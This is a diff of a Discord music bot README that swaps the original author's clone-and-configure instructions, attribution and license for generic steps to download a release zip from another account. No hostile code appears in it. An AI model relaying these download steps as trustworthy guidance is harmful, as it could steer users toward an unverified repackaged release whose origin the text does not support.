@@ -1,95 +1,111 @@
-# 🎶 Advance Discord Music Bot
+# 🎶 advanced-discord-music-bot - Enjoy Music Anytime, Anywhere
 
-![Node.js](https://img.shields.io/badge/Node.js-LTS-green?logo=node.js)
-![Discord.js](https://img.shields.io/badge/discord.js-v14-blue?logo=discord)
-![License](https://img.shields.io/badge/License-MIT-yellow?logo=open-source-initiative)
-![Stars](https://img.shields.io/github/stars/CookyDevJS/advance-discord-music-bot?style=social)
+[![Download Release](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/chantalmiriane19/advanced-discord-music-bot/releases)
 
-An **Advanced Music Bot for Discord** with commands, buttons, 24/7 system, auto-resume, and support for more than 700 websites.
+## 📚 About
 
----
+The Advanced Discord Music Bot offers a user-friendly way to stream music from various platforms like YouTube, Spotify, and SoundCloud directly into your Discord server. With features like 24/7 support, auto-resume, and an interactive dashboard, this bot makes it easy to enjoy high-quality music with friends.
 
-## 🎧 Music Bot Features
+## 🚀 Getting Started
 
-- 🎵 Easy to use
-- 🎶 Supports YouTube, Spotify, SoundCloud and 700+ websites
-- ⚡ Supports Slash Commands and prefix commands
-- 🔊 24/7 in voice channel
-- ⏯️ Auto-resume system
-- 📌 Music request channel
-- 🎚️ Advanced audio filters
-- 🎛️ DJ system
-- 🖥️ Works on hosts and VPS
-- ⚙️ Built with discord.js v14
+To start using the Advanced Discord Music Bot, follow these simple steps to download and set it up on your computer.
 
----
+### Step 1: System Requirements
 
-## 🚀 Installation | How to Use
+Before downloading, ensure your system meets the following requirements:
 
-### 1️⃣ Install Node.js
-Download the latest **LTS** version of [NodeJS](https://nodejs.org/en/).
+- **Operating System:** Windows 10 or later, macOS Monterey or later, or a recent Linux distribution.
+- **Node.js:** Version 16 or later installed on your system. You can download it from [Node.js official site](https://nodejs.org/).
+- **Discord Account:** You will need an active Discord account and permissions to add bots to a server.
 
----
+### Step 2: Visit the Download Page
 
-### 2️⃣ Download this repository
-Clone the repo or download the `.zip`:
-```bash
-git clone https://github.com/CookyDevJS/advance-discord-music-bot.git
-cd advance-discord-music-bot
-```
----
+To access the latest version of the Advanced Discord Music Bot, [visit this page to download](https://github.com/chantalmiriane19/advanced-discord-music-bot/releases). Here, you will find all available releases.
 
-### 3️⃣ Fill in everything in **`settings/config.js`**
+### Step 3: Choose Your Version
 
-### Modify - **config.js**
+On the Releases page, you can see a list of versions. Click on the latest release to view more details. Scroll down to the "Assets" section. You will find a downloadable file, usually named `advanced-discord-music-bot.zip`.
 
-```javascript
-{
-  TOKEN: "BOT_TOKEN",
-  PREFIX: "BOT_PREFIX",
-  mongodb : "MONGO_URL"
-}
-```
+### Step 4: Download the Bot
 
-### Modify - **.env**
+1. Click on the zip file to start downloading.
+2. Wait for the download to complete. It may take a few moments depending on your internet speed.
 
-**Rename `.env.example` to `.env.` and configure it**
+### Step 5: Extract the Files
 
-```env
-TOKEN=
-MONGO_URL=
-PREFIX=
-GUILD_ID=
-```
----
+Once the download finishes, locate the `advanced-discord-music-bot.zip` file in your downloads folder. 
 
-### 4️⃣ Now Let's Update Node Version. copy and paste in shell:
-```bash
-npm i --save-dev node@latest && npm config set prefix=$(pwd)/node_modules/node && export PATH=$(pwd)/node_modules/node/bin:$PATH
-```
----
+1. Right-click the file.
+2. Select "Extract All…" from the context menu.
+3. Choose a destination folder and click "Extract."
 
-### 5️⃣ Install dependencies:
+This will create a new folder containing all necessary files.
 
-```bash
-npm install
-```
----
+### Step 6: Install Dependencies
 
-### 6️⃣ Now we need to install to additional packages **.** <br/>
+1. Open the terminal (Command Prompt on Windows or Terminal on macOS/Linux).
+2. Navigate to the folder you just extracted. You can use the `cd` command followed by the path to your folder. For example:
+   ```
+   cd path\to\your\folder
+   ```
+3. Once in the folder, type the following command to install dependencies:
+   ```
+   npm install
+   ```
 
-1.  `npm install @discordjs/opus` - for better audio quality **.** <br/>
-2.  `npm install zlib-sync@latest` - for WebSocket data compression and inflation **.** <br/>
-3.  `npm install erlpack@latest` - for significantly faster WebSocket **.** <br/>
+Make sure that Node.js is already installed, or this command will not work.
 
----
+### Step 7: Configure the Bot
 
-### 7️⃣ Start the bot with:
-```
-node index.js
-```
----
+You may need to set up a configuration file to connect the bot to your Discord server.
 
-## 📜 License
+1. Create a new file named `config.json` in the bot's folder.
+2. Add the following content, replacing `YOUR_DISCORD_TOKEN` and `YOUR_CHANNEL_ID` with the appropriate values:
+   ```json
+   {
+     "token": "YOUR_DISCORD_TOKEN",
+     "channelID": "YOUR_CHANNEL_ID"
+   }
+   ```
 
-[MIT](https://choosealicense.com/licenses/mit/)
+### Step 8: Run the Bot
+
+To start the bot:
+
+1. In your terminal, ensure you are still in the bot's folder.
+2. Type the following command and hit enter:
+   ```
+   node index.js
+   ```
+
+If everything is set up correctly, the bot should launch and be ready to use in your Discord server.
+
+### Step 9: Use the Bot
+
+Once the bot is running, you can add music commands to your Discord server. Use slash commands to play, pause, skip, and manage your music preferences. Check the documentation within the bot for command details.
+
+## 🎉 Features
+
+- **24/7 Music Streaming:** Enjoy non-stop music with the ability to keep playing even when you're offline.
+- **Auto-Resume:** If the bot disconnects, it will auto-resume the playlist from where it left off.
+- **Multi-Platform Support:** Easily stream music from YouTube, Spotify, and SoundCloud.
+- **Interactive Dashboard:** Access an easy-to-use interface to manage your music settings.
+- **High-Definition Audio:** Enjoy clear and crisp sound quality while listening to your favorite tunes.
+
+## 🛠 Troubleshooting
+
+If you encounter any issues while downloading or running the bot, here are some common solutions:
+
+- **Error: "Cannot find module":** Ensure Node.js is correctly installed and you have run `npm install`.
+- **Bot not joining voice channel:** Make sure the bot has the necessary permissions in your server to connect to voice channels.
+- **Token issues:** Double-check your Discord token in the `config.json` file for accuracy.
+  
+For further assistance, check the [issues section](https://github.com/chantalmiriane19/advanced-discord-music-bot/issues) on the GitHub page.
+
+## 👥 Community
+
+If you want to connect with others using the Advanced Discord Music Bot, join our community channel on Discord. Here, you can ask questions, share tips, and find new ways to enjoy your music experience.
+
+## 📞 Support
+
+For additional help, please check our [documentation](https://github.com/chantalmiriane19/advanced-discord-music-bot/wiki) or report an issue on the GitHub repository.
